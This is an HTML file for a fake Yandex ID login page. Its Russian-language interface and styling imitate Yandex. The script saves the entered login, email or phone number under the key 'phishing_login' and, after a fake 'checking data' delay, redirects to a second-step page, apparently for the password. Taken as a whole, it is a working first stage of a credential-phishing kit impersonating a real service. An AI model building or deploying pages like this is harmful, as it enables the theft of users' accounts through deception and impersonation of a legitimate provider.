<!DOCTYPE html>
<html>
<head>
    <title>Вход в Яндекс</title>
    <style>
        /* Стили для имитации Яндекс */
        body { font-family: Arial, sans-serif; max-width: 400px; margin: 100px auto; padding: 20px; }
        .logo { text-align: center; margin-bottom: 30px; }
        .form-group { margin-bottom: 20px; }
        input[type="text"] { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 16px; }
        button { width: 100%; padding: 12px; background: #f00; color: white; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; }
        .error { color: red; display: none; margin-top: 10px; }
    </style>
</head>
<body>
    <div class="logo">
        <h2>Войдите с Яндекс ID</h2>
    </div>

    <form id="login-form">
        <div class="form-group">
            <label for="login">Логин, email или телефон</label>
            <input type="text" id="login" name="login" placeholder="Введите ваш логин" required>
        </div>
        
        <button type="submit">Войти</button>
    </form>

    <div id="loading" style="display: none;">
        <p>Проверяем данные...</p>
    </div>

    <script>
        document.getElementById('login-form').addEventListener('submit', function(event) {
            event.preventDefault();
            
            const login = document.getElementById('login').value;
            
            // Сохраняем логин для второй страницы
            sessionStorage.setItem('phishing_login', login);
            
            // Показываем загрузку
            document.getElementById('login-form').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Имитируем проверку и переход на страницу пароля
            setTimeout(function() {
                window.location.href = 'yandex_login_step2.html';
            }, 1500);
        });
    </script>
</body>
</html>
